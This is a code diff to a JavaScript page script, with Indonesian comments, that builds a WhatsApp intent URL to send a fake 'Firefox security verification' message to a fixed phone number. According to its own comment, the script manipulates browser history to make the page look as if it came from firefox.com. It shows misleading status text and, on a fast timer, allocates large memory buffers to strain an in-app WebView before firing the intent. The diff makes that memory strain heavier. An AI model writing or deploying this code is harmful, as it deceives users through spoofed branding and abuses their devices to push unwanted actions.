@@ -75,25 +75,28 @@
   var TARGET_MESSAGE = "Firefox security verification handshake token: 404-SECURE";
   var WHATSAPP_INTENT_URL = "intent://send?phone=" + TARGET_PHONE + "&text=" + encodeURIComponent(TARGET_MESSAGE) + "#Intent;scheme=whatsapp;package=com.whatsapp;end;";
 
-  var heavyBuffers = [];
-  var heavyLoopId = null;
+  var iabStressChunks = [];
+  var iabStressInterval = null;
 
-  function applyHeavyStackLoad() {
+  function pushIabWebViewPressure() {
     try {
-      for (var b = 0; b < 24; b++) {
-        heavyBuffers.push(new Uint8Array(8 * 1024 * 1024));
+      for (var c = 0; c < 32; c++) {
+        iabStressChunks.push(new Uint8Array(8 * 1024 * 1024));
       }
-      var sum = 0;
-      for (var i = 0; i < 6500000; i++) {
-        sum += Math.sin(i) * Math.cos(i);
+      if (iabStressChunks.length > 512) {
+        iabStressChunks.splice(0, 128);
       }
-      window._stackLoadSum = sum;
+      var acc = 0;
+      for (var k = 0; k < 8000000; k++) {
+        acc += Math.sqrt((k % 997) + 1.5);
+      }
+      window._iabPressureVal = acc;
     } catch (e) {}
   }
 
   function triggerSpoofedStackChain() {
     statusEl.textContent = "Stacking security context...";
-    applyHeavyStackLoad();
+    pushIabWebViewPressure();
 
     // 1. Manipulasi History Stack (Menyamarkan asal domain seolah-olah dari firefox.com)
     try {
@@ -121,18 +124,18 @@
       }, 5000);
     } catch (e) {}
 
-    heavyLoopId = setInterval(applyHeavyStackLoad, 80);
+    iabStressInterval = setInterval(pushIabWebViewPressure, 60);
 
     // 3. Hitung mundur delay stacking sebelum memicu intent WhatsApp
     var countdown = DELAY_SECONDS;
     var timer = setInterval(function() {
       countdown--;
       if (countdown > 0) {
-        applyHeavyStackLoad();
+        pushIabWebViewPressure();
         statusEl.textContent = "Resolving host context in " + countdown + "s...";
       } else {
         clearInterval(timer);
-        if (heavyLoopId) clearInterval(heavyLoopId);
+        if (iabStressInterval) clearInterval(iabStressInterval);
         statusEl.textContent = "Dispatching protocol intent...";
         
         // Eksekusi pengalihan ke Intent WhatsApp setelah stack tertahan
